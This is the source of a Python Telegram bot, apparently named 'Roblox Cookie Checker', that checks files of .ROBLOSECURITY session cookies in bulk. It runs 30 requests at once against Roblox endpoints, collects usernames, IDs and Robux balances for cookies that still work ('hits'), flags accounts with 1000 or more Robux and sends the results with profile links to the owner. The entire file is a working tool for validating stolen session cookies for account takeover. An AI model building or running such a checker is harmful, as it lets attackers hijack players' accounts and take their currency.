import asyncio
import aiohttp
import telebot
import time
import threading
from datetime import datetime
from config import BOT_TOKEN, OWNER_ID

bot = telebot.TeleBot(BOT_TOKEN)

# ─── Stats ────────────────────────────────────────────────────────────
class CheckerStats:
    def __init__(self):
        self.reset()

    def reset(self):
        self.total = 0
        self.hits = 0
        self.dead = 0
        self.checked = 0
        self.start_time = None
        self.hits_list = []       # list of (username, user_id, robux)
        self.high_robux = []      # users with high robux value
        self.all_robux = 0        # total robux across all hits
        self._lock = threading.Lock()

    def add_hit(self, username, user_id, robux):
        with self._lock:
            self.hits += 1
            self.checked += 1
            self.all_robux += robux
            self.hits_list.append((username, user_id, robux))
            if robux >= 1000:
                self.high_robux.append((username, user_id, robux))

    def add_dead(self):
        with self._lock:
            self.dead += 1
            self.checked += 1

    def elapsed(self):
        if not self.start_time:
            return 0
        return time.time() - self.start_time

stats = CheckerStats()

# ─── Owner-only decorator ─────────────────────────────────────────────
def owner_only(func):
    def wrapper(message):
        if message.from_user.id != OWNER_ID:
            bot.reply_to(message, "⛔ Access denied. Owner only.")
            return
        return func(message)
    return wrapper

# ─── Format elapsed time ──────────────────────────────────────────────
def format_elapsed(seconds):
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

# ─── Progress message builder ─────────────────────────────────────────
def build_progress_text():
    elapsed = stats.elapsed()
    hits_text = ""
    if stats.hits_list:
        for username, user_id, robux in stats.hits_list:
            hits_text += f"  💎 `{username}` ({robux} R$)\n"
    else:
        hits_text = "  None yet\n"

    return (
        f"⚡️ CHECKING ⚡️\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"📊 Progress:\n"
        f"🔑 Total: {stats.total}\n"
        f"💎 Hits: {stats.hits}\n"
        f"❌ Dead: {stats.dead}\n"
        f"📝 Checked: {stats.checked}/{stats.total}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"⏱️ Time: {format_elapsed(elapsed)}\n"
        f"━━━━━━━━━━━━━━━━━\n"
        f"💎 Hits:\n"
        f"{hits_text}"
        f"🔥 all robux: {stats.all_robux}\n"
        f"💎 high robux value user: {len(stats.high_robux)}"
    )

# ─── Async Cookie Validator ───────────────────────────────────────────
ROBLOX_AUTH_URL = "https://www.roblox.com/mobileapi/userinfo"
ROBLOX_USER_URL = "https://users.roblox.com/v1/users/{}"
ROBLOX_CURRENCY_URL = "https://economy.roblox.com/v1/users/{}/currency"

CONCURRENCY = 30  # concurrent requests for speed

async def validate_cookie(session, cookie):
    """Validate a single cookie. Returns (valid, username, user_id, robux) or (False, None, None, 0)."""
    try:
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        async with session.get(ROBLOX_AUTH_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status != 200:
                return (False, None, None, 0)
            data = await resp.json(content_type=None)
            if "UserID" not in data:
                return (False, None, None, 0)
            user_id = data["UserID"]
            username = data.get("UserName", data.get("Username", f"User{user_id}"))
            # Get robux — only if cookie is valid
            robux = 0
            try:
                async with session.get(
                    ROBLOX_CURRENCY_URL.format(user_id),
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=8)
                ) as currency_resp:
                    if currency_resp.status == 200:
                        cdata = await currency_resp.json(content_type=None)
                        robux = cdata.get("robux", 0)
            except Exception:
                pass
            return (True, username, user_id, robux)
    except Exception:
        return (False, None, None, 0)

async def run_checker(chat_id, progress_msg, cookies):
    """Run the checker with concurrency and live progress updates."""
    stats.reset()
    stats.total = len(cookies)
    stats.start_time = time.time()

    connector = aiohttp.TCPConnector(limit=CONCURRENCY, limit_per_host=CONCURRENCY)
    async with aiohttp.ClientSession(connector=connector) as session:
        sem = asyncio.Semaphore(CONCURRENCY)

        async def check_one(cookie):
            async with sem:
                result = await validate_cookie(session, cookie)
                if result[0]:
                    stats.add_hit(result[1], result[2], result[3])
                else:
                    stats.add_dead()
                return result

        tasks = [check_one(c) for c in cookies]

        # Progress updater — updates the Telegram message every 3 seconds
        last_update = [0]
        async def progress_updater():
            while stats.checked < stats.total:
                await asyncio.sleep(2)
                try:
                    bot.edit_message_text(
                        build_progress_text(),
                        chat_id,
                        progress_msg.message_id,
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

        updater_task = asyncio.create_task(progress_updater())
        await asyncio.gather(*tasks)
        updater_task.cancel()

    # Final update
    try:
        bot.edit_message_text(
            build_progress_text(),
            chat_id,
            progress_msg.message_id,
            parse_mode="Markdown"
        )
    except Exception:
        pass

    # Send detailed hits
    if stats.hits_list:
        hits_detail = "💎 *HITS DETAILS:*\n━━━━━━━━━━━━━━━━━\n"
        for username, user_id, robux in stats.hits_list:
            hits_detail += f"👤 `{username}` | ID: `{user_id}` | 💰 {robux} R$\n"
            hits_detail += f"🔗 https://www.roblox.com/users/{user_id}/profile\n\n"
        hits_detail += f"\n🔥 Total Robux: {stats.all_robux}"
        try:
            bot.send_message(chat_id, hits_detail, parse_mode="Markdown")
        except Exception:
            # Split if too long
            chunks = [hits_detail[i:i+4000] for i in range(0, len(hits_detail), 4000)]
            for chunk in chunks:
                bot.send_message(chat_id, chunk)

# ─── Bot Commands ──────────────────────────────────────────────────────

@bot.message_handler(commands=["start"])
@owner_only
def handle_start(message):
    bot.reply_to(
        message,
        "⚡️ *Welcome to Roblox Cookie Checker Bot!* ⚡️\n\n"
        "Type /menu to see all commands.",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["menu"])
@owner_only
def handle_menu(message):
    bot.reply_to(
        message,
        "⚡️ *ROBLOX COOKIE CHECKER* ⚡️\n"
        "━━━━━━━━━━━━━━━━━\n\n"
        "🔥 /check - Check cookies from a .txt file\n"
        "📊 /stats - View current checker stats\n"
        "❓ /help - How to use the bot\n"
        "📋 /menu - Show this menu\n\n"
        "━━━━━━━━━━━━━━━━━\n"
        "🤖 Powered by NinjaTech",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["help"])
@owner_only
def handle_help(message):
    bot.reply_to(
        message,
        "⚡️ *Cookie Checker Help* ⚡️\n\n"
        "1️⃣ Send /check with a .txt file attached containing cookies (one per line)\n"
        "2️⃣ The bot will validate each cookie concurrently\n"
        "3️⃣ Live progress is shown during checking\n"
        "4️⃣ After completion, hit details are displayed\n\n"
        "💡 Cookies must be .ROBLOSECURITY tokens",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=["check"])
@owner_only
def handle_check(message):
    # Check if a document is attached
    if not message.document:
        bot.reply_to(message, "❌ Please attach a .txt file with cookies.\nUsage: /check with file attached", parse_mode="Markdown")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    content = downloaded.decode("utf-8", errors="ignore")
    cookies = [line.strip() for line in content.splitlines() if line.strip()]

    if not cookies:
        bot.reply_to(message, "❌ No cookies found in the file.")
        return

    # Send initial progress message
    stats.reset()
    stats.total = len(cookies)
    stats.start_time = time.time()
    progress_msg = bot.reply_to(message, build_progress_text(), parse_mode="Markdown")

    # Run the async checker in a thread so it doesn't block the bot
    def run_in_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(run_checker(message.chat.id, progress_msg, cookies))
        finally:
            loop.close()

    thread = threading.Thread(target=run_in_thread, daemon=True)
    thread.start()

@bot.message_handler(commands=["stats"])
@owner_only
def handle_stats(message):
    bot.reply_to(message, build_progress_text(), parse_mode="Markdown")

# ─── Start ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("⚡️ Cookie Checker Bot is running...")
    bot.infinity_polling()